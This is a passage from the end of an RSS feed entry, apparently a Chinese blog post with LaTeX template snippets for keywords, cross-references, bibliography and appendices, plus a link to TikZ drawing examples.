		&lt;span style=&#34;color:#66d9ef&#34;&gt;\textbf&lt;/span&gt;{Keywords:}xxx;xxx;xxx;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\end&lt;/span&gt;{enabstract}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\end&lt;/span&gt;{document}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;交叉引用&#34;&gt;交叉引用&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\usepackage&lt;/span&gt;{hyperref}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\hypersetup&lt;/span&gt;{
	colorlinks=true,
	citecolor=blue,
	linkcolor=blue
}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\begin&lt;/span&gt;{document}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\ref&lt;/span&gt;{label}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\nameref&lt;/span&gt;{label}
	
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\cite&lt;/span&gt;{1} &lt;span style=&#34;color:#75715e&#34;&gt;% cite a reference
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\begin&lt;/span&gt;{thebibliography}{99} &lt;span style=&#34;color:#75715e&#34;&gt;% reference
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;\bibitem&lt;/span&gt;{1}
		xxx,xxx,xxx
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\end&lt;/span&gt;{thebibliography}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\end&lt;/span&gt;{document}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;附录&#34;&gt;附录&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\usepackage&lt;/span&gt;{appendix}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\renewcommand&lt;/span&gt;{&lt;span style=&#34;color:#66d9ef&#34;&gt;\appendixname&lt;/span&gt;}{Appendix~&lt;span style=&#34;color:#66d9ef&#34;&gt;\Alph&lt;/span&gt;{section}}

&lt;span style=&#34;color:#66d9ef&#34;&gt;\begin&lt;/span&gt;{document}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\newpage&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\appendix&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\section&lt;/span&gt;{xxxxx}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\end&lt;/span&gt;{document}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;画图&#34;&gt;画图&lt;/h2&gt;
&lt;p&gt;闲得无聊查了一下，惊奇地发现Latex甚至可以画图，而且功能极其庞大，甚至有老哥画了个印度地图。。。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://texample.net/tikz/examples/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://texample.net/tikz/examples/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;找到个网站。要用的时候到里面找吧。&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
